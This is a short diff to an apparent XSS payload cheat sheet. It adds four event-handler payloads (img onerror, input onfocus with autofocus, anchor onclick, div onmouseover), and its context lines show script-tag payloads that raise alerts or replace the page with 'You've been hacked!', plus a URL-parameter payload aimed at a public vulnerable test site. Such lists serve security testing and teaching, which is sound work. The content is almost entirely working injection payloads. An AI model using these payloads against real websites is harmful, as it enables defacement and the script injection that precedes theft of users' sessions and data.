@@ -78,6 +78,11 @@ XSS - attack PAYLOADS
 <script>document.body.innerHTML = "<h1>You've been
 hacked!</h1>";</script>
 
+<img src="nonexistent.jpg" onerror="alert('Stored XSS with img');">
+<input type="text" value="XSS"onfocus="alert('Stored XSS onfocus')" autofocus>
+<a href="#" onclick="alert('Stored XSS on click');">Click me</a>
+<div onmouseover="alert('Stored XSS on hover')"> Hover over this text!</div>
+
 <script>alert("Stored XSS");</script>
 
 https://testphp.vulnweb.com/search.php?query=<script>alert('URL XSS');</script>
